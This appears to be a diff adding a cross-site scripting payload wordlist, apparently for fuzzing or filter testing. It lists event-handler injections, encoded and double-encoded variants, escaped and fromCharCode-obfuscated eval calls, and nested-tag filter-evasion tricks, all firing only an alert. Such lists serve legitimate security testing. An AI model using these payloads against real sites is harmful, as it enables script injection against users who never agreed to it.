@@ -1,0 +1,26 @@
+XSS
+<sciprt>alert("XSS")</script>
+<input autofocus onfocus=alert("XSS")>
+<video src=1 onerror=alert("XSS")>
+<audio src=1 onerror=alert("XSS")>
+<xml onreadystatechange=alert("XSS")>
+<style onreadystatechange=alert("XSS")>
+<iframe onreadystatechange=alert("XSS")>
+<object type=image src=valid.gif onreadystatechange=alert("XSS")></object>
+<img type=image src=valid.gif onreadystatechange=alert("XSS")>
+<input type=image src=valid.gif onreadystatechange=alert("XSS")>
+<isindex type=image src=valid.gif onreadystatechange=alert("XSS")>
+<script onreadystatechange=alert("XSS")>
+<bgsound onpropertychange=alert("XSS")>
+<body onbeforeactivate=alert("XSS")>
+<body onfocusin=alert("XSS")>
+<x onclick=alert("XSS") src=a>Click here</x>
+%253cimg%20onerror=alert("XSS")%20src=a%253e
+%3cimg onerror=alert("XSS") src=a%3e
+<script>eval(‘a\u006cert("XSS")’);</script>
+<script>eval(‘a\x6cert("XSS")’);</script>
+<script>eval(‘a\154ert("XSS")’);</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
+<script><script>alert("XSS")</script>
+<scr<script>ipt>alert("XSS")</script>
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
